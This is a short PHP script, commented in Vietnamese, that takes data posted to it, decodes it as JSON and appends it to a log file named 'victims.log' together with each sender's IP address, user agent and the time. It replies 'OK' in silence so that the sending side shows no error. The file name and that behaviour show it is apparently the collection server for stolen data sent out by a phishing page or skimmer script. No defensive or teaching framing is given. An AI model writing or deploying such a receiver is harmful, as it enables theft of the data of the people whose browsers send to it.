<?php
// server.php - Nhận và lưu dữ liệu
$log_file = 'victims.log';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['data'])) {
    $raw_data = $_POST['data'];
    $decoded = json_decode($raw_data, true);
    
    // Ghi log với định dạng
    $entry = "[$time] IP: $ip | UA: $user_agent\n";
    $entry .= "DATA: " . print_r($decoded, true) . "\n";
    $entry .= str_repeat('-', 80) . "\n";
    
    file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);
    
    // Trả về response rỗng để không báo lỗi
    http_response_code(200);
    echo 'OK';
} else {
    // Nếu truy cập trực tiếp vào server.php
    echo 'Server đang hoạt động. Gửi POST với field "data" để ghi log.';
}
?>